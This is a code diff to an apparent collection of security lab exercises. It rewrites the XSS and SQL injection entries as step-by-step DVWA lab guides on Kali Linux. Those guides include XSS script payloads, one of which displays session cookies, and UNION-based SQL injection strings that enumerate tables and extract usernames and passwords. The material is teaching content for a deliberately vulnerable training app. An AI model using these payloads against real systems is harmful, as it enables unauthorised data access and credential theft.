@@ -519,25 +519,75 @@ for row in mycsv:
   {
     id: "xss",
     title: "XSS",
-    content: `Security Levels: Low | Medium | High
+    content: `
+      Aim
+        To identify and exploit Cross-Site Scripting (XSS) vulnerabilities in a vulnerable web application (DVWA) using Kali Linux.
 
-Reflected XSS:
-  <script>alert("Reflected XSS")</script>
+      Requirements
+        Kali Linux
+        DVWA (Damn Vulnerable Web Application)
+        Browser (Firefox/Chromium)
+        Apache & MySQL running
+      Step 1: Start DVWA Services
+        Open terminal:
+          sudo service apache2 start
+          sudo service mysql start
+        Open browser and go to:
+          http://localhost/dvwa
+          Login Credentials
+          Username: admin
+          Password: password
+        Set security level:
+          DVWA Security → Low → Submit
+      Step 2: Understanding XSS
+        XSS allows attackers to inject JavaScript code into a webpage that runs in another user’s browser.
+        Types in DVWA
+          Reflected XSS
+          Stored XSS
+          DOM Based XSS
+      Step 3: Reflected XSS Test
+        Go to:
+          DVWA → XSS (Reflected)
+        In the input box, type:
+          <script>alert('XSS')</script>
+        Click Submit.
+        Output
+          You will see a popup alert → XSS vulnerability confirmed.
 
-Stored XSS:
-  Name field:
-    <h3>hacker</h3>
-  Message field:
-    <script>alert("Stored XSS")</script>
-  → Refresh page to verify it is stored
+      Step 4: Stored XSS Test
+        Go to:
+          DVWA → XSS (Stored)
+        Fill the form:
+          Name:
+            <h1>Hacked</h1>
+          Message:
+            <script>alert('Stored XSS')</script>
+          Click:
+            Sign Guestbook
+          Refresh page → popup appears every time → Stored XSS successful.
 
-DOM XSS:
-  URL fragment:
-    #<script>alert("DOM XSS")</script>
+      Step 5: DOM Based XSS
+        Go to:
+          DVWA → XSS (DOM)
+        In the URL bar add:
+         #<script>alert('DOM XSS')</script>
+        Press Enter → popup appears.
 
-Cookie Theft (Stored):
-  Message:
-    <script>alert(document.cookie)</script>`,
+      Step 6: Capture Cookie (Lab Demo)
+        In Stored XSS Message box:
+          <script>alert(document.cookie)</script>
+        This shows session cookies (demo of session theft).
+
+      Step 7: Change Security Level
+        Go to:
+          DVWA Security
+        Set:
+          Medium
+          High
+          Repeat the same payloads → see how filtering blocks them.
+      Result
+        XSS vulnerabilities were successfully identified and exploited in DVWA.
+`,
   },
   {
     id: "packet",
@@ -596,32 +646,84 @@ Cookie Theft (Stored):
   {
     id: "sqli",
     title: "SQL Injection",
-    content: `Authentication Bypass:
-  1' OR '1'='1
-
-Find Number of Columns:
-  1' ORDER BY 1-- -
-  1' ORDER BY 2-- -
-  1' ORDER BY 3-- -
-
-UNION Injection:
-  1' UNION SELECT 1,2-- -
-
-Extract Database:
-  1' UNION SELECT database(),2-- -
-
-Extract Tables:
-  1' UNION SELECT table_name,2
-  FROM information_schema.tables
-  WHERE table_schema=database()-- -
-
-Extract Columns:
-  1' UNION SELECT column_name,2
-  FROM information_schema.columns
-  WHERE table_name='users'-- -
-
-Extract Credentials:
-  1' UNION SELECT user,password FROM users-- -`,
+    content: `
+    1. Aim of the Experiment:
+      To understand how SQL Injection vulnerabilities occur and how attackers exploit improper input validation to bypass authentication and extract database information.
+    2. Requirements
+      Kali Linux (VM or bare metal)
+      DVWA or WebGoat
+      Apache & MySQL (MariaDB)
+      Web browser (Firefox)
+      Basic SQL knowledge
+    3. Setting Up DVWA in Kali Linux
+      Step 1: Install DVWA
+        sudo apt update
+        sudo apt install dvwa -y
+      Step 2: Start Required Services
+        sudo service apache2 start
+        sudo service mysql start
+      Step 3: Configure DVWA
+        Edit config file:
+        sudo nano /etc/dvwa/config.inc.php
+        Ensure:
+          $_DVWA['db_password'] = '';
+        Save and exit.
+      Step 4: Open DVWA in Browser (Firefox)
+        http://127.0.0.1/dvwa
+        Login Credentials
+        Username: admin
+        Password: password
+        Click Create / Reset Database.
+      Step 5: Set Security Level
+        Go to DVWA Security
+        Set Security Level = Low
+        Click Submit
+    4. SQL Injection Attack on DVWA
+      Step 6: Navigate to SQL Injection Module
+        DVWA → Vulnerabilities → SQL Injection
+        You will see an input box asking for User ID.
+    5. Basic SQL Injection Test
+      Step 7: Normal Input
+        1
+        Displays user details normally.
+      Step 8: Authentication Bypass
+        Enter:
+          1' OR '1'='1
+      Result:
+        All user records are displayed
+        Confirms SQL Injection vulnerability
+    6. SQL Injection – Database Enumeration
+      Step 9: Find Number of Columns
+        1' ORDER BY 1-- -
+        1' ORDER BY 2-- -
+        1' ORDER BY 3-- -
+        Stop when error occurs.
+      Last successful number = total columns.
+      Step 10: UNION-Based Injection
+        1' UNION SELECT 1,2-- -
+      Step 11: Extract Database Name
+        1' UNION SELECT database(),2-- -
+      Step 12: Extract Table Names
+        1' UNION SELECT table_name,2
+        FROM information_schema.tables
+        WHERE table_schema=database()-- -
+      Step 13: Extract Column Names
+        1' UNION SELECT column_name,2
+        FROM information_schema.columns
+        WHERE table_name='users'-- -
+      Step 14: Extract Username & Password
+        1' UNION SELECT user,password FROM users-- -
+        Passwords may appear as hashes.
+    7. Result
+      The SQL Injection attack was successfully performed, demonstrating:
+        Authentication bypass
+        Unauthorized data access
+        Poor input validation vulnerability
+    8. Conclusion
+      This experiment proves that:
+        Unsanitized user input leads to SQL Injection
+        Attackers can extract sensitive database information
+        Proper security controls are mandatory`,
   },
   {
     id: "phishing",
